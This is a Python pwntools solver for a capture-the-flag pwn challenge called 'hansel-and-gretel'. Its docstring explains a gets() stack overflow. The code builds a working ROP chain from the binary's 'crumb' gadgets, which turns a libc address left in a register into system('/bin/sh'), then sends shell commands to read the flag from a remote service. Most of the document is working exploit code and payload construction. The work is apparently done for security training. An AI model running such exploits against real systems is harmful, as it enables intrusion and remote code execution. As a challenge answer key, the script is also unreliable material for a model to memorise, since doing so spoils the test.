#!/usr/bin/env python3
"""
hansel-and-gretel solver.

Vulnerability
-------------
`vuln()` reads a line with an unbounded `gets()` into a 24-byte stack
buffer (no canary, no PIE, full RELRO) -> classic stack buffer overflow
that gives full control of the saved RBP and the return address.

Just before the overflow, `vuln()` does:
    mov r12, [rbp+0x18]      ; reads *main's* saved return address, i.e.
                              ; the address inside __libc_start_call_main
                              ; right after it calls main() -- a libc
                              ; code address.
    ...
    mov rax, r12              ; move the leak into rax
    xor r12, r12
    leave
    ret                       ; `leave` never touches rax, so when our
                              ; first ROP gadget runs, rax == libc leak.

We never get to *see* this leaked value over the wire (nothing is ever
printed) but the binary ships 9 tiny helper gadgets (`_crumb1".."_crumb9`,
the titular "breadcrumbs") that are just enough to blindly turn that
in-register leak into `system("/bin/sh")`:

    _crumb1 (0x401136): pop rax; ret
    _crumb2 (0x401138): mov rdi, rax; ret
    _crumb3 (0x40113c): xor rbx, rbx; mov r11, rax; ret   (checkpoint + zero rbx)
    _crumb4 (0x401143): mov rax, r11; ret                 (restore checkpoint)
    _crumb5 (0x401147): mov r10w, ax; xor r10w, bx; shr r10, 8; ret
    _crumb6 (0x401154): xor bl, bl; mov bl, r10b; ret
    _crumb7 (0x40115a): shl rbx, 8; ret
    _crumb8 (0x40115f): add rax, rbx; ret
    _crumb9 (0x401163): call rax; ret

There is no `pop rbx` / `pop rdi` gadget, so the only way to get an
attacker-chosen value into rbx is the crumb5/6/7 dance: each round XORs
byte 1 (bits 8-15) of a freshly popped qword against byte 1 of the
*current* rbx, drops the result into rbx's low byte, then shifts rbx left
by a byte -- i.e. a byte-by-byte "shift register" builder ("basic
arithmetic with the gadgets I gave you", per the README). Because the
delta we add each time is a fixed, ASLR-independent, compile-time offset
between two locations in the *same* libc image, we can precompute the
exact bytes to pop for every round without ever knowing the real runtime
leak value.

Full chain:
  1. crumb3                              -> r11 = leak, rbx = 0
  2. build rbx = system_off - leak_off   (always chosen positive)
  3. crumb4; crumb8                      -> rax = leak + delta = system()
  4. crumb3 again                        -> r11 = system() (new checkpoint), rbx = 0
  5. build rbx = binsh_off - system_off  (always chosen positive)
  6. crumb4; crumb8                      -> rax = system() + delta = "/bin/sh"
  7. crumb2                              -> rdi = "/bin/sh"
  8. crumb4                              -> rax = r11 = system() again (free,
                                             r11 untouched by steps 5-7)
  9. crumb9                              -> call system(rdi) = system("/bin/sh")
"""
import os
import re
import sys

from pwn import *

context.clear(arch="amd64")

LIBC_PATH = "./libc.so.6"

# _crumbN addresses: the binary is not PIE, so these are fixed constants.
C1 = 0x401136  # pop rax; ret
C2 = 0x401138  # mov rdi, rax; ret
C3 = 0x40113C  # xor rbx, rbx; mov r11, rax; ret
C4 = 0x401143  # mov rax, r11; ret
C5 = 0x401147  # mov r10w, ax; xor r10w, bx; shr r10, 8; ret
C6 = 0x401154  # xor bl, bl; mov bl, r10b; ret
C7 = 0x40115A  # shl rbx, 8; ret
C8 = 0x40115F  # add rax, rbx; ret
C9 = 0x401163  # call rax; ret

# Offset (within __libc_start_call_main) of the return address pushed by
# `call rax` right after it invokes main(); this is what vuln() leaks.
LIBC_START_CALL_MAIN_LEAK_OFF = 0x29D90


def filler_qword(byte1):
    """8-byte value, free of 0x0a (gets()'s line terminator), with byte
    index 1 (bits 8-15) set to the requested value."""
    assert byte1 != 0x0A
    b = bytearray(b"A" * 8)
    b[1] = byte1
    assert 0x0A not in b
    return bytes(b)


def build_add_delta(delta):
    """ROP chain entries that, starting from rbx == 0, build rbx == delta
    (delta must be a small non-negative integer) using only
    crumb1/crumb5/crumb6/crumb7."""
    assert delta >= 0
    nbytes = max(1, (delta.bit_length() + 7) // 8)
    be = delta.to_bytes(nbytes, "big")
    chain = []
    mask = 0  # current byte 1 of rbx (0 initially, since rbx == 0)
    for i, want in enumerate(be):
        chunk_byte1 = want ^ mask
        if chunk_byte1 == 0x0A:
            raise ValueError("would need to transmit a forbidden 0x0a byte")
        chain += [p64(C1), filler_qword(chunk_byte1)]
        chain += [p64(C5), p64(C6)]
        if i != len(be) - 1:
            chain += [p64(C7)]
        mask = want
    return chain


def make_payload(libc):
    sys_off = libc.symbols["system"]
    binsh_off = next(libc.search(b"/bin/sh\x00"))

    delta1 = sys_off - LIBC_START_CALL_MAIN_LEAK_OFF
    delta2 = binsh_off - sys_off
    assert delta1 > 0 and delta2 > 0, "expected forward-only offsets"

    rop = []
    rop += [p64(C3)]                 # r11 = leak, rbx = 0
    rop += build_add_delta(delta1)   # rbx = system_off - leak_off
    rop += [p64(C4), p64(C8)]        # rax = leak + delta1 = system()
    rop += [p64(C3)]                 # r11 = system(), rbx = 0
    rop += build_add_delta(delta2)   # rbx = binsh_off - sys_off
    rop += [p64(C4), p64(C8)]        # rax = system() + delta2 = "/bin/sh"
    rop += [p64(C2)]                 # rdi = "/bin/sh"
    rop += [p64(C4)]                 # rax = r11 = system() again
    rop += [p64(C9)]                 # call system(rdi)

    payload = b"A" * 24          # buffer (rbp-0x18 .. rbp)
    payload += b"B" * 8          # saved rbp (unused, 'leave' just pops it)
    payload += b"".join(rop)
    assert 0x0A not in payload, "payload must not contain a literal newline"
    return payload


def main():
    libc = ELF(LIBC_PATH)

    host = os.environ["SERVICE_APP_MAIN_HOST"]
    port = int(os.environ["SERVICE_APP_MAIN_PORT"])
    io = remote(host, port)

    io.sendline(make_payload(libc))

    io.sendline(b"cat /home/user/flag; cat flag")
    io.sendline(b"echo ---END---")
    out = io.recvuntil(b"---END---", timeout=10, drop=True)
    print(out.decode(errors="replace"))

    m = re.search(rb"SCC\{[^}]*\}", out)
    io.close()
    if m:
        print("FLAG:", m.group(0).decode())
        return 0
    print("[-] flag not found in output", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
